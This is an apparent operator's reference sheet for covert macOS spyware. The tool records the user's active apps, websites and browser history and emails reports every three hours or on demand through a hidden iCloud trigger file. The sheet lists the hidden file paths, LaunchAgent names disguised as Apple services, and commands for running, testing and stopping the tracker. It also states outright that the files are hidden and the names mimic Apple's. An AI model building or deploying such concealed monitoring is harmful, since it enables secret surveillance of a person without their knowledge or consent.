# Reference Notes (Delete after reading)

## What It Tracks

1. **Active Window Tracking** (Real-time)
   - Which app is currently in focus
   - Actual time spent in each app
   - Website detection from browser window titles

2. **Browser History** (Periodic)
   - Pages visited
   - Video watching detection
   - Estimated time per page

3. **Remote Trigger** (On-demand)
   - Create file in iCloud to trigger report
   - Custom time range support

## Hidden Locations

| What | Path |
|------|------|
| Main Script | ~/.local/share/.cacheserviced.py |
| Trigger Monitor | ~/.local/share/.triggerwatch.py |
| Config | ~/.local/.metadata_sync.json |
| Database | ~/.local/share/.cache_index.db |
| Reports | ~/.local/share/.cache_reports/ |

## LaunchAgents (Auto-start)

| Service | Purpose |
|---------|---------|
| com.apple.metadata.windowtracker | Continuous active window tracking |
| com.apple.metadata.cacheservice | Email reports every 3 hours |
| com.apple.metadata.triggerwatch | iCloud remote trigger monitor |

## Remote Trigger (From iPhone)

**To send a report remotely:**

1. Open **Files** app on iPhone/iPad
2. Go to **iCloud Drive** (root folder)
3. Tap **...** → **New Document** or create empty file
4. Name it: `.report_XX` (XX = minutes)

**Examples:**
| Filename | Report Duration |
|----------|-----------------|
| `.report_30` | Last 30 minutes |
| `.report_60` | Last 1 hour |
| `.report_120` | Last 2 hours |
| `.report_180` | Last 3 hours |

Report will be sent within 30 seconds. A status file will appear in iCloud confirming delivery.

## Commands

```bash
# Test report (without email)
python3 ~/.local/share/.cacheserviced.py --scheduled --minutes 30

# Test with email
python3 ~/.local/share/.cacheserviced.py --scheduled --minutes 30 --send-email

# Manual tracking (foreground)
python3 ~/.local/share/.cacheserviced.py --track

# Check all services
launchctl list | grep metadata

# View tracking log
tail -f ~/.local/share/.cache_reports/.tracker.log

# View trigger log
tail -f ~/.local/share/.cache_reports/.trigger.log

# Stop all services
launchctl unload ~/Library/LaunchAgents/com.apple.metadata.windowtracker.plist
launchctl unload ~/Library/LaunchAgents/com.apple.metadata.cacheservice.plist
launchctl unload ~/Library/LaunchAgents/com.apple.metadata.triggerwatch.plist

# Start all services
launchctl load ~/Library/LaunchAgents/com.apple.metadata.windowtracker.plist
launchctl load ~/Library/LaunchAgents/com.apple.metadata.cacheservice.plist
launchctl load ~/Library/LaunchAgents/com.apple.metadata.triggerwatch.plist

# Uninstall completely
./uninstall.sh
```

## Email Reports Include

- Total screen time (actual tracked)
- Time per application (actual)
- Time per website (actual)
- Session counts
- Full interactive HTML report attached

## Notes
- All files hidden (start with ".")
- LaunchAgent names look like Apple services
- Window tracking polls every 5 seconds
- Trigger monitor polls every 30 seconds
- Reports emailed every 3 hours (or on-demand via iCloud)
- Requires Accessibility permissions for accurate tracking
- Requires iCloud Drive enabled for remote triggers
